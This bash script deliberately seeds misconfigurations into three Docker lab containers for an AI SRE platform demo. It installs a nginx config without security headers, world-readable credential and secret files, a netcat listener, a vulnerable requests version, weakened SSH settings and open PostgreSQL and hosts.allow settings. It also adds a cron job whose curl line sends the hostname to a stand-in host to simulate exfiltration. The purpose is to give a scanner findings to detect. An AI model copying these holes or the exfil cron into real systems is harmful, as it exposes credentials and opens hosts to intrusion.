#!/usr/bin/env bash
set -e

# ─────────────────────────────────────────────────────────────────────────────
# seed_vulnerabilities.sh
# Injects controlled, realistic vulnerabilities and misconfigurations into the
# three Docker lab containers for the AI SRE Platform demo.
#
# Containers:
#   linux-lab-01   — Web tier  (nginx)
#   linux-lab-02   — App tier  (Python)
#   network-lab-01 — DB/Config tier
# ─────────────────────────────────────────────────────────────────────────────

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
RESET='\033[0m'

ok()   { echo -e "  ${GREEN}[OK]${RESET}   $*"; }
fail() { echo -e "  ${RED}[FAIL]${RESET} $*"; }
skip() { echo -e "  ${YELLOW}[SKIP]${RESET} $*"; }

run() {
    local label="$1"; shift
    if "$@" 2>/dev/null; then
        ok "$label"
    else
        fail "$label"
    fi
}

header() {
    echo ""
    echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════${RESET}"
    echo -e "${CYAN}${BOLD}  MACHINE: $1${RESET}"
    echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════${RESET}"
}

# ─────────────────────────────────────────────────────────────────────────────
# linux-lab-01 — Web tier (nginx)
# ─────────────────────────────────────────────────────────────────────────────
header "linux-lab-01  (Web tier / nginx)"

# 1. Insecure nginx config — missing security headers
run "Install insecure nginx config (missing security headers)" \
    docker exec linux-lab-01 bash -c "cat > /etc/nginx/conf.d/demo.conf <<'NGINXEOF'
server {
    listen 80;
    server_name demo.local;

    # NOTE: X-Frame-Options header intentionally absent
    # NOTE: X-Content-Type-Options header intentionally absent
    # NOTE: Content-Security-Policy header intentionally absent
    # NOTE: Strict-Transport-Security header intentionally absent

    location / {
        root   /usr/share/nginx/html;
        index  index.html index.htm;
    }

    location /api/ {
        proxy_pass http://localhost:8080/;
    }
}
NGINXEOF"

# 2. World-readable credentials backup
run "Create world-readable credential backup (/etc/nginx/.htpasswd-backup)" \
    docker exec linux-lab-01 bash -c "
        echo 'admin:password123' > /etc/nginx/.htpasswd-backup
        echo 'deploy:deploy2024'  >> /etc/nginx/.htpasswd-backup
        echo 'monitor:mon!tor99' >> /etc/nginx/.htpasswd-backup
        chmod 644 /etc/nginx/.htpasswd-backup
    "

# 3. Debug port listener on 9999
run "Open debug port listener on TCP 9999 (netcat background)" \
    docker exec linux-lab-01 bash -c "
        which nc >/dev/null 2>&1 || apt-get install -y -q netcat-openbsd >/dev/null 2>&1 || true
        pkill -f 'nc -lk 9999' 2>/dev/null || true
        nohup nc -lk 9999 </dev/null >/dev/null 2>&1 &
        echo \$! > /tmp/.nc-debug.pid
    " || skip "netcat listener — nc may not be available in this image"

# 4. Sensitive-looking debug log in /tmp
run "Create /tmp/debug.log with sensitive content" \
    docker exec linux-lab-01 bash -c "cat > /tmp/debug.log <<'LOGEOF'
2024-01-15 03:12:44 [DEBUG] DB connect: postgresql://admin:Sup3rS3cr3t@db.internal:5432/prod
2024-01-15 03:12:44 [DEBUG] Redis auth: AUTH r3d!sP4ss
2024-01-15 03:12:45 [DEBUG] JWT secret loaded: hs256-secret-do-not-share-abc123xyz
2024-01-15 03:12:45 [INFO]  App started on 0.0.0.0:80
2024-01-15 03:14:02 [DEBUG] API key used: sk-live-XXXXXXXXXXXXXXXXXXXXXXXXXXXX
2024-01-15 03:14:05 [WARN]  Exception: unhandled NullPointerException at handler.py:88
LOGEOF
    chmod 644 /tmp/debug.log"

# ─────────────────────────────────────────────────────────────────────────────
# linux-lab-02 — App tier (Python)
# ─────────────────────────────────────────────────────────────────────────────
header "linux-lab-02  (App tier / Python)"

# 1. Vulnerable Python package
run "pip install requests==2.20.0 (CVE-2018-18074)" \
    docker exec linux-lab-02 bash -c "
        pip install --quiet 'requests==2.20.0' 2>&1 | tail -1 || true
    " || skip "pip install requests==2.20.0 — pip may not be available"

# 2. Weak SSH config
run "Weaken /etc/ssh/sshd_config (PermitRootLogin, PasswordAuth, X11Forwarding)" \
    docker exec linux-lab-02 bash -c "
        test -f /etc/ssh/sshd_config || touch /etc/ssh/sshd_config
        # Remove existing conflicting directives first
        sed -i '/^PermitRootLogin/d;/^PasswordAuthentication/d;/^X11Forwarding/d' /etc/ssh/sshd_config
        printf '\n# --- Demo misconfig injected by seed_vulnerabilities.sh ---\n' >> /etc/ssh/sshd_config
        printf 'PermitRootLogin yes\n' >> /etc/ssh/sshd_config
        printf 'PasswordAuthentication yes\n' >> /etc/ssh/sshd_config
        printf 'X11Forwarding yes\n' >> /etc/ssh/sshd_config
    "

# 3. World-writable /tmp/app-data
run "Create world-writable /tmp/app-data (chmod 777)" \
    docker exec linux-lab-02 bash -c "
        mkdir -p /tmp/app-data
        chmod 777 /tmp/app-data
        echo 'session_token=eyJhbGc.demo.token' > /tmp/app-data/session.cache
        chmod 644 /tmp/app-data/session.cache
    "

# 4. Suspicious cron job
run "Create suspicious cron entry /etc/cron.d/debug-job" \
    docker exec linux-lab-02 bash -c "
        mkdir -p /etc/cron.d
        cat > /etc/cron.d/debug-job <<'CRONEOF'
# Debug data exfil cron — injected by seed_vulnerabilities.sh
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Runs every minute — copies app data to world-readable location
* * * * * root cp -r /var/app/data /tmp/app-data-snapshot 2>/dev/null || true

# Weekly: sends diagnostics outbound (simulate exfil pattern)
0 2 * * 0 root curl -s http://debug.example.internal/collect?host=\$(hostname) >/dev/null 2>&1 || true
CRONEOF
        chmod 644 /etc/cron.d/debug-job
    "

# ─────────────────────────────────────────────────────────────────────────────
# network-lab-01 — DB/Config tier
# ─────────────────────────────────────────────────────────────────────────────
header "network-lab-01  (DB/Config tier)"

# 1. Insecure PostgreSQL-like config
run "Create /etc/demo-pg.conf with insecure PostgreSQL settings" \
    docker exec network-lab-01 bash -c "cat > /etc/demo-pg.conf <<'PGEOF'
# PostgreSQL configuration — demo-pg.conf
# WARNING: This config is intentionally insecure for lab purposes

# Connections
listen_addresses = '*'
port = 5432
max_connections = 200

# Security (misconfigured)
ssl = off
password_encryption = md5

# Logging (audit disabled)
log_connections = off
log_disconnections = off
log_statement = 'none'
log_min_duration_statement = -1

# Replication (no restrictions)
wal_level = replica
hot_standby = on
PGEOF
    chmod 644 /etc/demo-pg.conf"

# 2. Fake unencrypted DB backup in /tmp
run "Create /tmp/db-backup.sql.gz (unencrypted backup in /tmp)" \
    docker exec network-lab-01 bash -c "
        echo 'PostgreSQL database dump - prod - 2024-01-15 02:00:01' | gzip > /tmp/db-backup.sql.gz 2>/dev/null \
            || echo 'PostgreSQL database dump - prod - 2024-01-15 02:00:01' > /tmp/db-backup.sql
        chmod 644 /tmp/db-backup.sql.gz 2>/dev/null || chmod 644 /tmp/db-backup.sql 2>/dev/null || true
    "

# 3. Unrestricted hosts.allow
run "Set /etc/hosts.allow to 'ALL: ALL' (no network restriction)" \
    docker exec network-lab-01 bash -c "
        cat > /etc/hosts.allow <<'HOSTSEOF'
# /etc/hosts.allow — TCP wrappers access control
# WARNING: Intentionally permissive — injected by seed_vulnerabilities.sh

ALL: ALL
HOSTSEOF
        chmod 644 /etc/hosts.allow
    "

# 4. Postgres-exposed marker
run "Create /tmp/.postgres-exposed marker (simulated open port 5432)" \
    docker exec network-lab-01 bash -c "
        cat > /tmp/.postgres-exposed <<'MARKEREOF'
POSTGRES_EXPOSED=true
BIND_ADDRESS=0.0.0.0
PORT=5432
SSL=off
AUTH_METHOD=md5
SEEDED_BY=seed_vulnerabilities.sh
MARKEREOF
        chmod 644 /tmp/.postgres-exposed
    "

# ─────────────────────────────────────────────────────────────────────────────
# Summary
# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo -e "${BOLD}══════════════════════════════════════════════════${RESET}"
echo -e "${GREEN}${BOLD}  Demo vulnerabilities seeded.${RESET}"
echo -e "${BOLD}  Run demo/seed_findings.py to generate findings.${RESET}"
echo -e "${BOLD}══════════════════════════════════════════════════${RESET}"
echo ""
